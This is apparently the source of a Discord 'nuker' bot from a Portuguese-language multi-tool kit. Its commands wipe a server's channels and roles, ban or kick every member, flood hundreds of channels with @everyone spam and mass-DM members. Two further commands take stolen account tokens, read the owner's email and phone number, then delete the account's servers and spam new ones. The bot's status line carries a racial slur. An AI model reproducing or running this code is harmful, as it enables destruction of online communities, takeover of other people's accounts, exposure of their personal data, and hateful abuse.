module.exports.self = function () {


process.title = "Lofy Multi Tools - Bot Nuker"
const Discord = require("discord.js"),
	client = new Discord.Client({ws: {intents: new Discord.Intents(Discord.Intents.ALL)}}),
    readline = require("readline").createInterface({input: process.stdin, output: process.stdout}),
	colors = require("colors"),
    axios = require("axios"),
	json = require("../Arquivos Config/config.json")

process.on("unhandledRejection", e => {})
process.on("uncaughtException", e => {})
process.on("uncaughtRejection", e => {})
process.warn = () => {}

		client.on("ready", () => {
			console.clear();
			console.log(`\n\n
   ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗     ██████╗  ██████╗ ████████╗
   ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝
   ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝    ██████╔╝██║   ██║   ██║   
   ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══██╗██║   ██║   ██║   
   ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║    ██████╔╝╚██████╔╝   ██║   
   ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝    ╚═╝   
    \n\n`.magenta)


			console.log(`   Logado na conta > ${client.user.username}#${client.user.discriminator}`.yellow);
			console.log(`   Prefixo > ${json.prefixo}`.yellow);
			console.log(`   Permissão Necessária > ADMINISTRATOR`.yellow);
			console.log(`   Estou em ${client.guilds.cache.size} servidores`.yellow);
			console.log(`   Evistei ${client.users.cache.size} usuarios`.yellow);
            console.log("\n\n")

			client.user.setActivity(`With Sed Nigger`, {
				type: "STREAMING",
				url: `https://www.twitch.tv/polarlofy`
			});
		})

		client.on("error", () => {})
		client.on("warn", () => {})

		client.on("message", async message => {

			if (message.author.bot) return;
			if (message.mentions.everyone === true) {} else if (true === true) {

				if (message.content.startsWith(json.prefixo + "help")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {

						return message.reply("Você não pode utilizar este comando!");
					} else {


						const helpEmbed = new Discord.MessageEmbed()
							.setAuthor(message.author.username, message.author.avatarURL({dynamic: true}))
							.setTitle("Comandos do Bot")
							.setThumbnail("https://cdn.discordapp.com/attachments/608711474952798221/880822167112134686/iinastasy_89063738_2540878906022484_7551585202717459636_n.jpg")
                            .addField("**Criar Varios canais**", json.prefixo + "`cc [texto]`")
                            .addField("**Cria Varios canais e marca todos com uma mensagem**", json.prefixo + "`mp [texto]`")
                            .addField("**Criar Varios cargos**", json.prefixo + "`mr [texto]`")
                            .addField("**Deleta todos os canais**", json.prefixo + "`delcc`")
                            .addField("**Deleta todos os cargos**", json.prefixo + "`delrole`")
                            .addField("**Bane todos os membros**", json.prefixo + "`banall`")
                            .addField("**Expulsa todas as pessoas**", json.prefixo + "`chute`")
                            .addField("**Muda o nome do servidor**", json.prefixo + "`visual`")
                            .addField("**Envia mensagem para todos no pv**", json.prefixo + "`dmall`")
                            .addField("**Verifica um token**", json.prefixo + "`tk_checker [token]`", true)
                            .addField("**Limpa uma conta**", json.prefixo + "`tk_clean [token]`", true)
							.setImage(`https://cdn.discordapp.com/banners/331087845722816513/6fb86c75bd52bbe80ea9c0187e182870?size=4096`)
							.setColor("RANDOM")
							.setTimestamp(Date.now());
						message.channel.send(helpEmbed);

					}
				}
				


				if (message.content.startsWith(json.prefixo + "visual")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);
						return message.reply("Você não pode utilizar este comando!");
					}

					console.log("   [!] Mudando icone & nome do servidor".blue);
					message.guild.setName("Derrubado por PolarLofy");
					message.guild.setIcon("https://cdn.discordapp.com/avatars/922958683497955368/a_184686c6aecceb82f0cc24583b1a2420.gif");

				}
				

				if (!message.content.startsWith(json.prefixo)) return;

				if (message.author.id != json.Nuker.id) {
					console.log(`   [!] Um idiota tentou utilizando um comando`.white);
					return message.reply("Você não pode utilizar este comando!");
				}

				const args = message.content.slice(json.prefixo.length).trim().split(/ +/g);
				const command = args.shift().toLowerCase()



				if (command == "tk_checker") {
                    message.delete()
					const filtro = m => m.author.id === message.author.id;
					message.channel.send(new Discord.MessageEmbed()
						.setDescription("[:warning:]-Envie o token a baixo desta mensagem")
						.setColor("RED"));
					message.channel.awaitMessages(filtro, {
							max: 1,
							time: 20000,
							errors: ["time"]
						}).then(coleccion => {const token = coleccion.first();const tkn = token.content;
                  const headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Content-Type": "application/json",Authorization: tkn};
							axios({method: "GET",url: "https://discordapp.com/api/v8/users/@me",headers: headers}).then(res => {
									if (res.statusText == "OK") {

										let Nitro;
										let Numero;

										let MFA;
										let NSFW;

										let Verificado;

										if (res.data.premium_type == 1) {
											Nitro = "Nitro Classic";

										} else if (res.data.premium_type == 2) {
											Nitro = "Nitro Boost";

										} else {
											Nitro = "Não tem nitro";
										}

										if (res.data.phone) {
											Numero = res.data.phone;

										} else if (res.data.phone == null) {
											Numero = "Não tem numero vinculado.";
										}

										if (res.data.mfa_enabled == true) {
                            MFA = "Sim, esta ativado.";

										} else if (res.data.mfa_enabled == false) {
                            MFA = "Não esta ativado.";
										}

										if (res.data.verified == true) {
                            Verificado = "Esta Verificado.";

										} else if (res.data.verified == false) {
											Verificado = "Não esta verificado.";
                        }


										message.channel.send(new Discord.MessageEmbed()
											.setAuthor(message.author.tag, message.author.avatarURL({dynamic: true}))
											.addField("👤 - Usuario", res.data.username + "#" + res.data.discriminator, true)
											.addField("🆔 - ID", res.data.id, false)
											.addField("🎫 - MFA Ativada?", MFA, false)
											.addField("💳 - Tem Nitro?", Nitro, false)
											.addField("📩 - E-mail", res.data.email, false)
											.addField("✅ - E-mail Verificado?", Verificado, false)
											.addField("🌍 - Linguagem", res.data.locale, false)
											.addField("📱 - Telefone Vinculado?", Numero, false)
											.setColor("GREEN")
											.setFooter(`Pedido por: ${message.author.tag}`)
											.setTimestamp());


									} else return message.channel.send("[:warning:]-Token Invalido")
								})
								.catch(err => {
                      message.channel.send("[:warning:]-Ocorreu um erro");
                    });
						})
                .catch(err => {
                  message.channel.send("[:warning:]-Não encontrei nenhum token");
                });
            }
				


				if (command == "tk_clean") {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);
						return message.reply("Você não pode utilizar este comando!");
            }

					const filtro = m => m.author.id === message.author.id;
					message.channel.send(new Discord.MessageEmbed().setDescription("[:warning:]-Envie o token a baixo desta mensagem").setColor("RED"));
					message.channel.awaitMessages(filtro, {max: 1,time: 20000,errors: ["time"]})
						.then(coleccion => {
							const token = coleccion.first();
							const tkn = token.content;

							message.channel.send("[💤]-Derrubando...");
							const headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Content-Type": "application/json",Authorization: tkn};
							const guild = {icon: "",name: "Tu cuenta fue nukeada",region: "us-west"};
							const limit = {limit: 100};
							axios({method: "GET",url: "https://discordapp.com/api/v6/users/@me/guilds",headers: headers})
                  .then(res => {
                    for (let i = 0; i < res.data.length; i++) {
                      console.log(res.data[i]);
                      axios({
                        method: "delete",
                        url: `https://discordapp.com/api/v6/guilds/` + res.data[i].id,
                        headers: headers,
                        data: limit
                      });
										axios({
                            method: "delete",
                            url: `https://discordapp.com/api/v6/users/@me/guilds/` + res.data[i].id,
                            headers: headers,
                            data: limit
                        })
											.then(res => {
                              for (let i = 0; i < 100; i++) {
                                axios({
                                  method: "POST",
                                  url: "https://discordapp.com/api/v6/guilds",
                                  data: guild,
                                  headers: headers
                                })
                                .then(res => {});
                              }
                            });
                        }
                      })
                      .then(message.channel.send("[✅] Conta limpada"));
                    })
                    .catch(err => {
                      console.log(err);
                    });
                  }
				


				if (message.content.startsWith(json.prefixo + "cc")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);
						return message.reply("Você não pode utilizar este comando!");
					}

					if (!message.guild.me.permissions.has("MANAGE_CHANNELS")) {} else {
						if (message.author.id != json.Nuker.id) {

							console.log(`   [!] Um idiota tentou utilizando um comando`.white);
							return message.reply("Você não pode utilizar este comando!");

						} else {
							let args = message.content.split(" ").slice(1);
							var argresult = args.join(" ");
						}

						const ch = args[0];
						if (!ch) return message.reply(`   [!] Argumento faltandot **${json.prefixo}ch <nome>**`);

						message.delete();
						console.log("   [!] Criando Canais".blue);
						for (var i = 0; i < 100; i++) {
							message.guild.channels.create(ch);
						}
					}

				}
				


				if (message.content.startsWith(json.prefixo + "mp")) {
                    message.delete()
					if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
						return console.log("   [!] O bot esta sem permição".red);

					} else {
						if (message.author.id != json.Nuker.id) {
							console.log(`   [!] Um idiota tentou utilizando um comando`.white);
							return message.reply("Você não pode utilizar este comando!");

						} else {
							let args = message.content.split(" ").slice(1);

							var argresult = args.join(" ");
							if (!argresult) {
								console.log(`   [!] Marcando e postando umas coisas`.blue);

								for (var i = 0; i < 100; i++) {
									message.guild.channels.create("Derrubado-por");

									for (var i = 0; i < 100; i++) {
										let channels = message.guild.channels.create("Derrubado-por");

										channels.then(function(channel, index) {
											for (var i = 0; i < 100; i++) {
												channel.send("@everyone " + argresult);
                            }
										});
									}}}
							console.log("   [!] Marcando e criado canais".blue);
							for (var i = 0; i < 100; i++) {
								let channels = message.guild.channels.create("Derrubado por PolarLofy");
								channels.then(function(channel, index) {
									for (var i = 0; i < 100; i++) {
										channel.send("@everyone " + argresult);
									}
								});
                  }}
                }}
				


				if (message.content.startsWith(json.prefixo + "mr")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);
						return message.reply("Você não pode utilizar este comando!");
					}

					if (!message.guild.me.permissions.has("MANAGE_ROLES")) {
						return message.reply("Você não poder utilizar este comando!");
					} else {

						const role = args[0];
						if (!role) return message.reply(`Argumento faltando **${json.prefixo}mr <nome do cargo>**`);

						message.delete();
						console.log("   [!] Criando cargos".blue);

						for (var i = 0; i < 100; i++) {
							message.guild.roles.create({name: role,color: "RANDOM",reason: "Muito ez só"})
                  .catch(e => console.error("   [!] Erro ao criar cargos".red));
                }}
            }
				


				if (message.content.startsWith(json.prefixo + "delcc")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);

						return message.reply("Você não pode utilizar este comando!");

					}
					console.log("   [!] Deletando todos os canais".blue);
					if (message.author.id !== json.Nuker.id) return;

					message.guild.channels.cache.forEach(channel => {
						channel.delete()
							.catch(console.error);
					});

				}
				


				if (message.content.startsWith(json.prefixo + "chute")) {
                    message.delete()
					console.log("   [!] Expulsando todos os membros".blue);
					if (!message.guild.me.permissions.has("KICK_MEMBERS")) {

						return message.reply("Você não pode utilizar este comando!");
					} else {

						message.guild.members.cache.forEach(member => {
							member.kick({reason: "nuking"})
                  .then(e => {})
                  .catch(e => {});
						});
					}

          }
				


				if (message.content.startsWith(json.prefixo + "delrole")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);
						return message.reply("Você não pode utilizar este comando!");
					}

					console.log("   [!] Deletando cargos".blue);
					message.guild.roles.cache.forEach(roles => {
						roles.delete().catch(e => {})})

				}
				


				if (message.content.startsWith(json.prefixo + "banall")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);
						return message.reply("Você não pode utilizar este comando!");
					}


					console.log("   [!] Banindo todos os membros".blue);
					if (!message.guild.me.permissions.has("BAN_MEMBERS")) {} else {
						message.guild.members.cache.forEach(member => {
							member.ban({days: 7,reason: "ez"})
                  .then(e => {})
                  .catch(e => {});
						});
					}
				}
				


				if (message.content.startsWith(json.prefixo + "dmall")) {
                    message.delete()
					if (message.author.id != json.Nuker.id) {
						console.log(`   [!] Um idiota tentou utilizando um comando`.white);
						return message.reply("Você não pode utilizar este comando!");
					}

					console.log("   [!] Enviando mensagem no privado de todos".blue);
					if (message.author.id !== json.Nuker.id) return;

					const msg = args[0];
					if (!msg) return message.reply("Especifique a mensagem que deseja enviar");

					message.guild.members.cache.forEach(member => {
						member.send(msg).then(console.log(`   [!] Mensagem enviada para ${member.user.tag}`.green)).catch(e => console.error(`   [!] Erro ao enviar para ${member.user.tag}`.red));
					});
				}}
        });



		client.login(json.token_bot)
		.catch((err) => {
			require('./Fim/index').acabou(2, "\n   [!] Token Invalido!\n   "+err+"\n   [1] Tentar Novamente\n   [2] Sair".red, "", readline, "", "", "bot-nuker", "")
		})
}
